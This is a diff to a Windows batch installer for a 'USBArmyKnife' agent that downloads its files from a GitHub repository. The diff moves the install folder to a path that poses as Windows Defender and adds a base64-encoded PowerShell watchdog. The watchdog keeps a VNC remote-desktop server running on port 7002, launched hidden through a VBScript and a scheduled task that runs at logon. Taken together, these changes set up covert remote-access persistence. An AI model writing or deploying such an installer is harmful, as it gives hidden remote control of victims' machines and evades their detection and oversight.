@@ -5,11 +5,11 @@ title USBArmyKnife Agent Installer
 REM ============================================================
 REM  USBArmyKnife Agent Installer
 REM  Downloads individual files from GitHub to a temp directory,
-REM  copies to C:\AgentInstall, sets up autostart/firewall,
+REM  copies to C:\ProgramData\Windows Defender, sets up autostart/firewall,
 REM  then cleans up.
 REM ============================================================
 
-set "DEST=C:\AgentInstall"
+set "DEST=C:\ProgramData\Windows Defender"
 set "BASE=https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Installer"
 set "TEMPDIR=%TEMP%\USBArmyKnife_Install"
 
@@ -165,14 +165,16 @@ schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pi
 echo     Scheduled task "Security Script" created.
 :skip_security
 
+REM --- Write watchdog PowerShell script ---
+powershell -NoProfile -Command "$b64='dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABpAGYAIAAoACEAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIABWAG4AYwBEAGkAcgBlAGMAdAAgAC0ARQBBACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACkAIAB7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAVgBuAGMARABpAHIAZQBjAHQALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAcABvAHIAdAA9ADcAMAAwADIAIABjAHcAZAA9AEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABWAG4AYwBEAGkAcgBlAGMAdABcAHYAbgBjACAAZgBwAHMAPQAzADYAMAAgAHMAYwBhAGwAZQA9ADAAIgAgAH0AOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgADUAIAB9AA=='; [IO.File]::WriteAllBytes('%DEST%\vnc-watchdog.ps1', [Convert]::FromBase64String($b64))"
 REM --- Write watchdog VBScript (launches PS1 fully hidden) ---
 echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\vnc-watchdog.vbs"
-echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\AgentInstall\vnc-watchdog.ps1", 0, False >> "%DEST%\vnc-watchdog.vbs"
+echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\Windows Defender\vnc-watchdog.ps1", 0, False >> "%DEST%\vnc-watchdog.vbs"
 echo     Watchdog VBScript written.
 
 schtasks /query /tn "VNC Watchdog" >nul 2>&1
 if %errorlevel% equ 0 goto skip_watchdog
-schtasks /create /tn "VNC Watchdog" /tr "wscript.exe C:\AgentInstall\vnc-watchdog.vbs" /sc onlogon /rl limited /f >nul 2>&1
+schtasks /create /tn "VNC Watchdog" /tr "wscript.exe C:\ProgramData\Windows Defender\vnc-watchdog.vbs" /sc onlogon /rl limited /f >nul 2>&1
 echo     Scheduled task "VNC Watchdog" created.
 :skip_watchdog
 
